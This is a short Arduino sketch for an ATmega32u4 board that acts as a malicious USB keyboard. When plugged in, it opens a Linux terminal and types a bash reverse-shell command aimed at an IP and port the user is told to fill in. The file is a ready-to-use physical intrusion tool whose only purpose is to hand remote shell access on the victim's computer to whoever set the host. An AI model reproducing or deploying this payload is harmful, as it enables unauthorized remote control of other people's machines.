//You need Keyboard.h library and also you must edit ip and port in code
//This will work with Atmega32u4 microcontroller like Arduino Leanordo

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  //Open terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("bash");

  typeKey(KEY_RETURN);

  delay(500);
  
  Keyboard.print("setxkbmap us");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("bash -i >& /dev/tcp/your_ip_here/your_port_here 0>&1");

  typeKey(KEY_RETURN);

  delay(500);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
